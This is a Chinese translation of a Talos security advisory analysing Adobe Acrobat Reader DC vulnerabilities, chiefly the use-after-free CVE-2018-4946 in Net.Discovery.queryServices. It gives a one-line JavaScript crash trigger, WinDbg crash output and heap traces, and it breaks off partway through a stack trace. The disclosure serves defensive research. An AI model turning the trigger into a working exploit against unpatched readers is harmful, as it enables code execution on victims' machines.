# 针对多个Adobe Acrobat Reader DC漏洞的分析
|
##### 译文声明
本文是翻译文章，文章来源：https://blog.talosintelligence.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、概述
5月15日，Talos发布了关于Adobe Acrobat Reader DC新发现漏洞的详细信息。Adobe Acrobat
Reader是目前最流行、功能最丰富的PDF阅读器，该产品拥有庞大的用户群，是大多数用户系统中的默认PDF阅读器，同时还作为阅读PDF的插件集成到Web浏览器之中。因此，要利用该漏洞，只需要欺骗用户访问恶意网页，或者发送一封特殊构造的电子邮件即可。  
在版本号为2018.009.20044的Adobe Acrobat Reader
DC中打开特制的PDF文档时，嵌入在PDF文档中的特定JavaScript脚本可能会导致文档ID字段在一个没有边界的复制操作中被使用，从而造成基于栈的缓冲区溢出。这种基于栈的缓冲区溢出会造成返回地址被覆盖，从而导致任意代码执行的风险。要触发这两个漏洞，前提是被感染用户必须要打开恶意文件，或访问恶意网页。
## 二、Net.Discovery.queryServices远程执行代码漏洞（CVE-2018-4946）
###  2.1 概述
我们使用版本号为2018.009.20044的Adobe Acrobat Reader
DC打开PDF文档时，嵌入在PDF文件中的特定JavaScript脚本可能会导致一个指向先前被释放对象的指针重新被使用。如果攻击者利用该漏洞对内存进行操作，可能会导致敏感内存泄漏或任意代码执行的风险。要触发该漏洞，需要被感染用户打开恶意文件或访问恶意网站。
###  2.2 CVSSv3评分
7.1 – CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H
###  2.3 通用弱点枚举（CWE）
CWE-416: Use After Free
###  2.4 漏洞细节
Adobe Acrobat Reader
DC支持在PDF中嵌入JavaScript脚本，从而允许阅读并使用交互式PDF表单。该功能特性为攻击者提供了精确控制内存布局的能力，使其从另一个攻击面实现攻击行为。在受此漏洞影响的PDF文档中执行下面的JavaScript代码时，可以触发一个UAF条件：
    try{this.Net.Discovery.queryServices( "", {} ); }catch(e){app.alert(e);}
在启用页堆（Page Heap）的情况下，该行JavaScript代码会导致崩溃：
    eax=17a6acb8 ebx=29464fe0 ecx=29464fe0 edx=771f6c74 esi=2a064fd8 edi=2a064fd0
    eip=520e2961 esp=0031f01c ebp=0031f02c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    Annots!PlugInMain+0x9ea60:
    520e2961 ff7318          push    dword ptr [ebx+18h]  ds:0023:29464ff8=????????
    0:000>
被ebx指向的内存会被释放，造成该指针无效，从而导致崩溃。要使用Net.Discovery.queryServices方法需要具有特权，默认情况下对该方法的使用会因安全权限不足而被阻止。但是，如果文档来自于可信的来源，那么该方法就能够被执行，并导致崩溃。为触发崩溃，其中第一个参数需要使用无效的服务名称，可以是一个空的字符串。  
我们对分配进行追踪，就可以看到ebx中的指针在以前的函数调用中实际是这样使用的。ebx中的指针，实际上来自于分配在Annots!PlugInMain+0x4c01的一个大小为0x30的数组：
    0:000> !heap -p -a eax
        address 292c2fd0 found in
        _DPH_HEAP_ROOT @ 191000
        in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                    292215b0:         292c2fd0               30 -         292c2000             2000
        6b258e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
        77276206 ntdll!RtlDebugAllocateHeap+0x00000030
        7723a127 ntdll!RtlpAllocateHeap+0x000000c4
        77205950 ntdll!RtlAllocateHeap+0x0000023a
        62f8ed43 MSVCR120!malloc+0x00000049
        55848b02 Annots!PlugInMain+0x00004c01
        55848ab1 Annots!PlugInMain+0x00004bb0
        55a4ba1b Annots!PlugInMain+0x00207b1a
        558e1e29 Annots!PlugInMain+0x0009df28
        558e2308 Annots!PlugInMain+0x0009e407
        56b4267d EScript!mozilla::HashBytes+0x0004201b
        56b275b6 EScript!mozilla::HashBytes+0x00026f54
        56b217c2 EScript!mozilla::HashBytes+0x00021160
        56b205f0 EScript!mozilla::HashBytes+0x0001ff8e
        56b204fb EScript!mozilla::HashBytes+0x0001fe99
        56b20442 EScript!mozilla::HashBytes+0x0001fde0
        56b09e18 EScript!mozilla::HashBytes+0x000097b6
        56b48697 EScript!mozilla::HashBytes+0x00048035
        56b4841a EScript!mozilla::HashBytes+0x00047db8
        56b47e8d EScript!mozilla::HashBytes+0x0004782b
        56b46d7f EScript!mozilla::HashBytes+0x0004671d
        56bb622c EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x0005f52d
        6023b42f AcroRd32!AIDE::PixelPartInfo::operator=+0x000e3aaf
        60179c7d AcroRd32!AIDE::PixelPartInfo::operator=+0x000222fd
        601763b1 AcroRd32!AIDE::PixelPartInfo::operator=+0x0001ea31
        5ffcd185 AcroRd32!AX_PDXlateToHostEx+0x00159618
        5ffcd683 AcroRd32!AX_PDXlateToHostEx+0x00159b16
        601799da AcroRd32!AIDE::PixelPartInfo::operator=+0x0002205a
        5fc6426f AcroRd32!PDAlternatesGetCosObj+0x0001d51f
        5fc2b14b AcroRd32!CTJPEGWriter::CTJPEGWriter+0x000b9c1b
        5fba268b AcroRd32!CTJPEGWriter::CTJPEGWriter+0x0003115b
    5fba1761 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00030231
我们在存储最终解引用（Dereference）的指针的dword处，设置一个写入访问断点，这样就可以追溯到其来源：
    0:000> ba w 4 292c2ffc
    0:000> dd 292c2ffc
    0:000> g
    Breakpoint 6 hit
    eax=29d26fe0 ebx=29d26fe0 ecx=55a494c0 edx=771f6c74 esi=28a2cff8 edi=292c2fd0
    eip=55a49408 esp=0018c9e4 ebp=0018ca0c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    Annots!PlugInMain+0x205507:
    55a49408 e86941e0ff      call    Annots!PlugInMain+0x9675 (5584d576)
    0:000> dd 292c2ffc
    292c2ffc  29d26fe0 ???????? ???????? ????????
    0:000> !heap -p -a 29d26fe0
        address 29d26fe0 found in
        _DPH_HEAP_ROOT @ 191000
        in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                    2a3221d4:         29d26fe0               1c -         29d26000             2000
        6b258e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
        77276206 ntdll!RtlDebugAllocateHeap+0x00000030
        7723a127 ntdll!RtlpAllocateHeap+0x000000c4
        77205950 ntdll!RtlAllocateHeap+0x0000023a
        62f8ed43 MSVCR120!malloc+0x00000049
        55848b02 Annots!PlugInMain+0x00004c01
        55848ab1 Annots!PlugInMain+0x00004bb0
        558e22e7 Annots!PlugInMain+0x0009e3e6
        56b4267d EScript!mozilla::HashBytes+0x0004201b
        56b275b6 EScript!mozilla::HashBytes+0x00026f54
        56b217c2 EScript!mozilla::HashBytes+0x00021160
        56b205f0 EScript!mozilla::HashBytes+0x0001ff8e
        56b204fb EScript!mozilla::HashBytes+0x0001fe99
        56b20442 EScript!mozilla::HashBytes+0x0001fde0
        56b09e18 EScript!mozilla::HashBytes+0x000097b6
        56b48697 EScript!mozilla::HashBytes+0x00048035
        56b4841a EScript!mozilla::HashBytes+0x00047db8
        56b47e8d EScript!mozilla::HashBytes+0x0004782b
        56b46d7f EScript!mozilla::HashBytes+0x0004671d
        56bb622c EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x0005f52d
        6023b42f AcroRd32!AIDE::PixelPartInfo::operator=+0x000e3aaf
        60179c7d AcroRd32!AIDE::PixelPartInfo::operator=+0x000222fd
        601763b1 AcroRd32!AIDE::PixelPartInfo::operator=+0x0001ea31
        5ffcd185 AcroRd32!AX_PDXlateToHostEx+0x00159618
        5ffcd683 AcroRd32!AX_PDXlateToHostEx+0x00159b16
        601799da AcroRd32!AIDE::PixelPartInfo::operator=+0x0002205a